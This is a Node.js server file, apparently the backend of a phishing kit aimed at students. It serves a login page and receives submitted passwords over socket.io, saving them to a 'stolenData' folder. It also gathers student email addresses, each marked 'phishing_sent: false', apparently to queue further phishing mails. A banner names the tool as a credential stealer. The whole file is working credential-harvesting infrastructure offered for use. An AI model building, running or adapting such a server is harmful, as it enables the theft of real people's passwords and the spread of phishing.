const http = require('http');
const express = require('express');
const socketIo = require('socket.io');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Configure Express to serve static files from the root directory
app.use(express.static(__dirname));

// Start the Express server on the specified port
const PORT = 3100;

io.on('connection', (socket) => {
    console.log('A client (for pwd) has connected');

    socket.on('sendPWD', (data) => {
        console.log('Password received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'pwd.json');

        // Create the directory if it does not exist
        fs.mkdir(path.dirname(filePath), { recursive: true }, (err) => {
            if (err) {
                console.error('Error creating directory', err);
                return;
            }

            // Check if the JSON file exists and is not empty or corrupt
            fs.stat(filePath, (err, stats) => {
                if (err || stats.size === 0) {
                    console.error('The JSON file is empty or corrupt, initializing as an empty array');
                    writeDataToFile(filePath, [data]);
                } else {
                    // Read and parse the existing JSON file content
                    fs.readFile(filePath, 'utf8', (err, fileData) => {
                        if (err) {
                            console.error('Error reading the file', err);
                            return;
                        }

                        let jsonData;
                        try {
                            jsonData = JSON.parse(fileData);
                            if (!Array.isArray(jsonData)) {
                                console.error('The existing JSON data is not an array, initializing as an empty array');
                                jsonData = [];
                            }
                        } catch (parseErr) {
                            console.error('Error parsing the JSON file', parseErr);
                            return;
                        }

                        // Check if the user already exists in the array
                        const userExists = jsonData.some(item => item.user === data.user);
                        if (userExists) {
                            console.log(`User ${data.user} already exists in the array, not adding.`);
                        } else {
                            // Add the new data to the array
                            jsonData.push(data);

                            // Write the updated array to the JSON file
                            writeDataToFile(filePath, jsonData);
                        }
                    });
                }
            });
        });
    });


});

// FOR MAIL ADDRESSES
io.on('connection', (socket) => {
    console.log('A client (for student emails) has connected');

    socket.on('sendMail', (data) => {
        console.log('Student emails received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'mail.json');

        // Check if the JSON file exists and is not empty or corrupt
        fs.stat(filePath, (err, stats) => {
            if (err || stats.size === 0) {
                console.error('The JSON file is empty or corrupt, initializing as an empty array');
                const newData = [
                    { email: data.student1.email, phishing_sent: false },
                    { email: data.student2.email, phishing_sent: false }
                ];
                writeDataToFile(filePath, newData);
            } else {
                // Read and parse the existing JSON file content
                fs.readFile(filePath, 'utf8', (err, fileData) => {
                    if (err) {
                        console.error('Error reading the file', err);
                        return;
                    }

                    let jsonData;
                    try {
                        jsonData = JSON.parse(fileData);
                        if (!Array.isArray(jsonData)) {
                            console.error('The existing JSON data is not an array, initializing as an empty array');
                            jsonData = [];
                        }
                    } catch (parseErr) {
                        console.error('Error parsing the JSON file', parseErr);
                        return;
                    }

                    // Check if student1 email exists in the JSON data
                    const student1Exists = jsonData.some(item => item.email === data.student1.email);
                    if (student1Exists) {
                        console.log(`Email ${data.student1.email} already exists, not adding.`);
                    } else {
                        jsonData.push({ email: data.student1.email, phishing_sent: false });
                    }

                    // Check if student2 email exists in the JSON data
                    const student2Exists = jsonData.some(item => item.email === data.student2.email);
                    if (student2Exists) {
                        console.log(`Email ${data.student2.email} already exists, not adding.`);
                    } else {
                        jsonData.push({ email: data.student2.email, phishing_sent: false });
                    }

                    // Write the updated array to the JSON file
                    writeDataToFile(filePath, jsonData);
                });
            }
        });
    });
});
// Function to write data to file
function writeDataToFile(filePath, data) {
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
        if (err) {
            console.error('Error writing data to the file', err);
        } else {
            console.log('Data successfully saved in the studentEmails.json file');
        }
    });
}

console.log(`
      _             _     ______              ____   _____              _            _   _       _     
     | |           | |   |  ____|            |___ \\ / ____|            | |          | | (_)     | |    
  ___| |_ ___  __ _| |___| |__   ___ ___  ___  __) | |     _ __ ___  __| | ___ _ __ | |_ _  __ _| |___ 
 / __| __/ _ \\/ _\` | / __|  __| / __/ __|/ _ \\|__ <| |    | '__/ _ \\/ _\` |/ _ \\ '_ \\| __| |/ _\` | / __|
 \\__ \\ ||  __/ (_| | \\__ \\ |____\\__ \\__ \\  __/___) | |____| | |  __/ (_| |  __/ | | | |_| | (_| | \\__ \\
 |___/\\__\\___|\\__,_|_|___/______|___/___/\\___|____/ \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|___/
                                                                                                       
                                                                                                       
`);

server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}/login.html`);
});

app.get('/favicon.ico', (req, res) => res.status(204));
